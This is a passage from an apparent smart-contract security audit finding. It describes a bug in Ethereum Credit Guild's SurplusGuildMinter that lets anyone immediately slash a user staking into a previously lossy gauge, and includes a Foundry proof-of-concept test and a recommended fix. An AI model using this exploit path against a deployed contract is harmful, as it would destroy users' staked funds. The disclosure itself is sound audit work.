158:functionunstake(addressterm,uint256amount)external{159:// apply pending rewards160:        (,UserStakememoryuserStake,boolslashed) =getRewards(161:msg.sender,162:term163:        );164:165:// if the user has been slashed, there is nothing to do166:if(slashed)return;
Since the user has been consideredslashed, the execution will return on line 166 and the user will not be allowed to withdraw their stakedCredit.
I would also like to note that the user will still have a chance to receive someearned Creditafter the gauge experiences a profit. However, since the user is consideredslashed, they will not be given anyguild rewards:
SurplusGuildMinter.sol#L247-L264
247:uint256deltaIndex=_profitIndex-_userProfitIndex;248:249:if(deltaIndex!=0) {250:uint256creditReward= (uint256(userStake.guild) *deltaIndex) /251:1e18;252:uint256guildReward= (creditReward*rewardRatio) /1e18;253:if(slashed) {254:guildReward=0;255:            }256:257:// forward rewards to user258:if(guildReward!=0) {259:RateLimitedMinter(rlgm).mint(user,guildReward);260:emitGuildReward(block.timestamp,user,guildReward);261:            }262:if(creditReward!=0) {263:CreditToken(credit).transfer(user,creditReward);264:            }
As seen above, if the user is eligible to claim rewards (the gauge they staked into has experienced a profit), then they will be sentcreditRewardofCredit. However, since they are consideredslashed, theirguildRewardis set to0. This scenario will only occur if no one callsgetRewardfor this user before the gauge generates a profit. If any call togetRewardfor this user is invoked before that, the user will not be able to receive any rewards and in both situations they will lose their stakedCredit.
An additional, lesser effect, is that theGuildwhich was minted on behalf of the user who staked will not be unstaked from the gauge, it will not be burned, and theRateLimitedGuildMinter’s buffer will not be replenished. I.e. the following code from theunstakefunction will not execute:
SurplusGuildMinter.sol#L205-L208
205:// burn GUILD206:GuildToken(guild).decrementGauge(term,guildAmount);207:RateLimitedMinter(rlgm).replenishBuffer(guildAmount);208:GuildToken(guild).burn(guildAmount);
Impact
User’s utilizing theSurplusGuildMinterto stake into a gauge, which has previously experienced a loss sometime in its history, can be immediately slashed. This will result in the user losing out on any guild rewards (if they were staked into the gauge while it experienced a profit), but most importantly this will result in the user losing their staked principle (Credit).
To further illustrate the impact of this vulnerability, lets consider the following scenario:
A gauge experiences a loss. The gauge is then off-boarded. The gauge is re-onboarded in the future. A user stakes into this gauge via theSurplusGuildMinter. A malicious actor immediately callsgetRewards(gauge, user)and the user isslashedand loses their stakedCredit.
Proof of Concept
The following test describes the main impact highlighted above, in which a user stakes into a previously lossy gauge and is immediately slashed:
Place the following test inside oftest/unit/loan/SurplusGuildMinter.t.sol:
functiontestUserImmediatelySlashed()public{// initial stateassertEq(guild.getGaugeWeight(term),50e18);// add credit to surplus buffercredit.mint(address(this),100e18);credit.approve(address(profitManager),50e18);profitManager.donateToSurplusBuffer(50e18);// term incurs lossprofitManager.notifyPnL(term, -50e18);assertEq(guild.lastGaugeLoss(term),block.timestamp);// term offboardedguild.removeGauge(term);assertEq(guild.isGauge(term),false);// time passes and term is re-onboardedvm.roll(block.number+100);vm.warp(block.timestamp+ (100*13));guild.addGauge(1,term);assertEq(guild.isGauge(term),true);// user stakes into term directlyaddressuser=address(0x01010101);guild.mint(user,10e18);vm.startPrank(user);guild.incrementGauge(term,10e18);vm.stopPrank();// user can un-stake from termvm.startPrank(user);guild.decrementGauge(term,10e18);vm.stopPrank();// user stakes into term via sgmcredit.mint(user,10e18);vm.startPrank(user);credit.approve(address(sgm),10e18);sgm.stake(term,10e18);vm.stopPrank();// check after-stake stateassertEq(credit.balanceOf(user),0);assertEq(profitManager.termSurplusBuffer(term),10e18);assertEq(guild.getGaugeWeight(term),70e18);SurplusGuildMinter.UserStakememoryuserStake=sgm.getUserStake(user,term);assertEq(uint256(userStake.stakeTime),block.timestamp);assertEq(userStake.lastGaugeLoss,guild.lastGaugeLoss(term));assertEq(userStake.profitIndex,0);assertEq(userStake.credit,10e18);assertEq(userStake.guild,20e18);// malicious actor is aware of bug and slashes the user's stake immediately, despite no loss occurring in the gaugesgm.getRewards(user,term);// check after-getReward state (user was slashed even though no loss has occurred since term was re-onboarded)assertEq(credit.balanceOf(user),0);assertEq(profitManager.termSurplusBuffer(term),10e18);assertEq(guild.getGaugeWeight(term),70e18);userStake=sgm.getUserStake(user,term);assertEq(uint256(userStake.stakeTime),0);assertEq(userStake.lastGaugeLoss,0);assertEq(userStake.profitIndex,0);assertEq(userStake.credit,0);assertEq(userStake.guild,0);// user tries to unstake but will not receive anythinguint256userBalanceBefore=credit.balanceOf(user);vm.startPrank(user);sgm.unstake(term,10e18);vm.stopPrank();uint256userAfterBalance=credit.balanceOf(user);assertEq(userBalanceBefore,0);assertEq(userAfterBalance,0);}
Recommended Mitigation Steps
Similar to how theGuildToken::incrementGaugefunction initializes a user’slastGaugeLossAppliedvalue, theSurplusGuildMintershould initialize a user’suserStake.lastGaugeLosstoblock.timestamp. It should then compare thelastGaugeLossto the user’s storeduserStake.lastGaugeLossinstead of comparing thelastGaugeLossto a freshly initializeduserStakememory struct, whose fields are all0.
eswak (Ethereum Credit Guild) confirmed via duplicate issue #1164
Note: For full discussion, seehere.

